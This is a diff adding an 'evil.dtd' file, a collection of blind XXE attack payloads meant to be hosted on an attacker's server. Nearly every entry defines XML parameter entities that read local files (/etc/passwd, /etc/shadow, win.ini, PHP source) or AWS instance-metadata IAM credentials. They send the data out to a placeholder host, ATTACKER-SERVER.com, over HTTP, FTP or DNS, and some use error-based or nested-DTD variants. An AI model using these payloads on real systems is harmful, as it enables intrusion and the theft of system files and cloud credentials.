@@ -1,0 +1,74 @@
+<!-- evil.dtd - Example DTD file for Blind XXE attacks -->
+<!-- Host this file on your server (e.g., http://attacker.com/evil.dtd) -->
+
+<!-- Basic Out-of-Band Data Exfiltration -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?data=%file;'>">
+%eval;
+%exfil;
+
+<!-- Alternative: FTP-based exfiltration -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER-SERVER.com/%file;'>">
+%eval;
+%exfil;
+
+<!-- Error-based XXE -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+<!-- Base64 encoded file exfiltration -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?data=%file;'>">
+%eval;
+%exfil;
+
+<!-- Multi-step parameter entity trick -->
+<!ENTITY % param1 "<!ENTITY &#x25; param2 '<!ENTITY &#x26; exfil SYSTEM \"http://ATTACKER-SERVER.com/?data=%file;\">'>">
+%param1;
+%param2;
+
+<!-- CDATA wrapper to handle special characters -->
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-SERVER.com/?data=%start;%file;%end;'>">
+%all;
+
+<!-- Windows file exfiltration -->
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/windows?data=%file;'>">
+%eval;
+%exfil;
+
+<!-- Multiple file exfiltration -->
+<!ENTITY % file1 SYSTEM "file:///etc/passwd">
+<!ENTITY % file2 SYSTEM "file:///etc/shadow">
+<!ENTITY % eval "<!ENTITY &#x25; exfil1 SYSTEM 'http://ATTACKER-SERVER.com/1?data=%file1;'><!ENTITY &#x25; exfil2 SYSTEM 'http://ATTACKER-SERVER.com/2?data=%file2;'>">
+%eval;
+%exfil1;
+%exfil2;
+
+<!-- DNS exfiltration (for environments without HTTP/FTP access) -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.ATTACKER-SERVER.com'>">
+%eval;
+%exfil;
+
+<!-- Nested DTD loading -->
+<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/nested.dtd">
+%remote;
+
+<!-- Cloud metadata exfiltration -->
+<!ENTITY % aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/aws?creds=%aws;'>">
+%eval;
+%exfil;
+
+<!-- PHP filter wrapper for source code -->
+<!ENTITY % source SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/source?code=%source;'>">
+%eval;
+%exfil;
